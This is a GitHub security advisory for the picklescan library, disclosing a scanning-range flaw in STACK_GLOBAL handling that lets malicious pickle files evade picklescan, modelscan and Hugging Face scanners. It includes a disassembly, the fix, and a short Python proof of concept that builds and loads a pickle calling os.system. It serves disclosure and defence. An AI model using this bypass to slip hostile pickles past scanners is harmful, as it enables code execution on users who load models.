# [H] Picklescan has pickle parsing logic flaw that leads to malicious pickle file bypass

## Summary
Severity: High
Advisory: GHSA-9gvj-pp9x-gcfr
CVE: CVE-2025-71325
CWE: CWE-502
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-08-12
Source: https://github.com/advisories/GHSA-9gvj-pp9x-gcfr
Type: github-advisory

## Affected
- PyPI: `picklescan` — affected >=0 <0.0.27

## Details
### Details
There's a parsing logic error in picklescan and modelscan while trying to deal with opcode `STACK_GLOBAL`.
Function `_list_globals` when handling `STACK_GLOBAL` at position `n`, it is expected to track two arguments but in wrong range. The loop only consider the range from `1` to `n-1` but forgets to consider the opcode at position `0`. The correct range should be `0` to `n-1`. Attacker can put arg in position `0`, thus the parser can only tract one argument. Then, the exception https://github.com/mmaitre314/picklescan/blob/2a8383cfeb4158567f9770d86597300c9e508d0f/src/picklescan/scanner.py#L281 will be triggered. Thus it can cause detection bypass since the malicious pickle file will trigger unexpected exceptions.

Example:
```
    0: S    STRING     'os' --> arg 0: STRING (untracked argument due to wrong scanning range)
    6: S    STRING     'system' --> arg 1: STRING (tracked argument)
   16: \x93 STACK_GLOBAL
   17: S    STRING     'ls'
   23: \x85 TUPLE1
   24: R    REDUCE
   25: .    STOP
```


### PoC
``` python
import pickle
payload = b"S'os'\nS'system'\n\x93S'ls'\n\x85R."
with open('bad_pickle.pkl', 'wb') as f:
    f.write(payload)
pickle.load(open('bad_pickle.pkl', 'rb'))
```

### Impact
Detection bypass in both picklescan and modelscan. Note that it also affects the online hugging face pickle scanners, making the malicious pickle file bypass the detection. 

### Fix
To fix the range here, change `range(1, n)` to `range(1, n+1)` to ensure that `n-offset` stays within the range of `0` to `n`.
https://github.com/mmaitre314/picklescan/blob/2a8383cfeb4158567f9770d86597300c9e508d0f/src/picklescan/scanner.py#L255

## References
- https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9gvj-pp9x-gcfr
- https://nvd.nist.gov/vuln/detail/CVE-2025-71325
- https://github.com/mmaitre314/picklescan/commit/2a8383cfeb4158567f9770d86597300c9e508d0f
- https://github.com/mmaitre314/picklescan/commit/58983e1c20973ac42f2df7ff15d7c8cd32f9b688
- https://github.com/mmaitre314/picklescan
- https://github.com/mmaitre314/picklescan/blob/2a8383cfeb4158567f9770d86597300c9e508d0f/src/picklescan/scanner.py#L255
- https://github.com/mmaitre314/picklescan/blob/2a8383cfeb4158567f9770d86597300c9e508d0f/src/picklescan/scanner.py#L281
- https://github.com/mmaitre314/picklescan/releases/tag/v0.0.27
- https://www.vulncheck.com/advisories/picklescan-detection-bypass-via-stack-global-opcode-parsing-logic-flaw
